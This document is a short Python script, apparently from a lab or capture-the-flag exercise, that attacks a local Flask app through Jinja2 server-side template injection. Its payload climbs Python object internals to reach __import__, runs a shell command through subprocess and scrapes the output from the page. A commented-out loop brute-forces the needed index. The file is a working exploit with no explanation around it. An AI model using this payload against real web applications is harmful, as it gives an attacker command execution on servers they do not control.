import requests
import re
import HTMLParser

def sendPayload(payload_arg="me"):
    url = "http://127.0.0.1:5000/"
    result1 = requests.post(url,data={"name":payload_arg}).text
    return result1
    

#['__class__', '__cmp__', '__contains__', '__delattr__', '__delitem__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', 'clear', 'copy', 'fromkeys', 'get', 'has_key', 'items', 'iteritems', 'iterkeys', 'itervalues', 'keys', 'pop', 'popitem', 'setdefault', 'update', 'values', 'viewitems', 'viewkeys', 'viewvalues']


payload ='{{"".__class__.__mro__[2].__subclasses__()[59].__repr__.__globals__.items()[13][1]["__import__"]("subprocess").check_output("ls")}}'
x= '("subprocess").check_output("ls")}}'


resutl = sendPayload(payload)

try:
    regex = "<h2>Hello ([\s\S]*)<\/h2>"
    matches = re.findall(regex,resutl)
    print HTMLParser.HTMLParser().unescape(matches[0])
except:
    print "RESULT ERROR:\n"+resutl

#this was used to find the index of variables
'''
for e in range(0,100):
    try:
        payload ='{{"".__class__.__mro__[2].__subclasses__()[59].__repr__.__globals__.items()[%i][0]["import"]}}'%e
        resutl = sendPayload(payload)
        regex = "<h2>Hello ([\s\S]*)<\/h2>"
        matches = re.findall(regex,resutl)
        print str(e)+HTMLParser.HTMLParser().unescape(matches[0])
    except:
        print ""
'''
